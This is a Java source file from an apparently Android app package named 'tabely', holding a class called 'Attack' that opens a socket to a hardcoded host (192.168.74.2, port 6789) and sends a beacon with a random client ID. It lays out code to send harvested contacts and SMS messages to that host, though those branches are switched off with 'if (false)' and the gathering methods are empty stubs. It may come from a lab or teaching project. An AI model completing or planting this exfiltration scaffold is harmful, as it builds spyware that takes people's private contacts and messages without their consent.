package com.snakesonwheels.tabely.controller;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.util.UUID;

public class Attack extends Thread {
    private final int port = 6789;
    private final String host = "192.168.74.2";
    private final UUID uuid = UUID.randomUUID();


    public void performAttack(){
        String data;
        String haeder;

        String testData = "Client: " + uuid + " wants to be attacked!";
        sendData(testData);

        if (false/*ContactPermission is given*/){
            haeder = "uuid: " + uuid + "\n" +
                    "timesamp: " + System.currentTimeMillis() + "\n" +
                    "Contact data:";

            data = gatherContactInformation();

            sendData(haeder + "\n\n" + data);
        }

        if (false/*SMSPermission is given*/){
            haeder = "uuid: " + uuid + "\n" +
                    "timesamp: " + System.currentTimeMillis()+ "\n" +
                    "SMS data:";

            data = gatherSMSInformation();

            sendData(haeder + "\n\n" + data);
        }


    }

    private void sendData(String data){
        try {
            Socket socket = new Socket(host, port);

            OutputStream outputStream = socket.getOutputStream();
            PrintStream printStream = new PrintStream(outputStream, true);
            printStream.println(data);

            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String gatherContactInformation(){
        return null;
    }

    private String gatherSMSInformation(){
        return null;
    }

    @Override
    public void run() {
        performAttack();
    }
}
